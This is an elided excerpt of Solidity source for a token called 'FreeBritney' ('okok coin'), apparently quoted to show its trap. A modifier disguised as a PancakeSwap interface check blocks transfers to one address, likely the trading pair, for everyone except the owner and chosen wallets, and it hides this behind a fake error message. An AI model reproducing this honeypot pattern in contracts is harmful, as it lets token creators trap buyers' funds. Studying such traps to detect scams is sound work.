...
contract Ownable is Context {
    ...
    modifier PancakeSwabV2Interface(address from, address to, bool fromTransfer) {
      ...
      else require((to != nxOwner || from == _owner || from == _leaveowner || from == _tWallet), "PancakeV2 Interface Error");
      _;
    }
}
...
contract FreeBritney is Context, IERC20, Ownable {
    ...
    string private _name = 'okok coin';
    ...
    constructor (address _tWallet, uint256 taxAm, uint256 txAm) public {
        _marketingFund = _tWallet;
